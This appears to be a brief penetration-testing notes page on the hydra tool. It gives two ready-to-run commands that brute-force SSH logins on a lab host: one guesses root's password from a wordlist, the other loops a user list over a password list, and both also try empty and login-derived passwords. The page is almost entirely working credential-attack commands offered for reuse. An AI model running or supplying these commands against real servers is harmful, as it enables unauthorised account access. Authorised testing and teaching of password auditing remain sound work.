---
title: "hydra"
date: 2020-03-06T13:02:27+01:00
draft: false
weight: 60
---

## known username, password list

root with passwordlist, null password, login as pass and reversed login as pass.

```bash
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr
```

## user list, password list

userlist with passwordlist, null password, login as pass and reversed login as pass looped around users.

```bash
hydra -v -V -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u
```
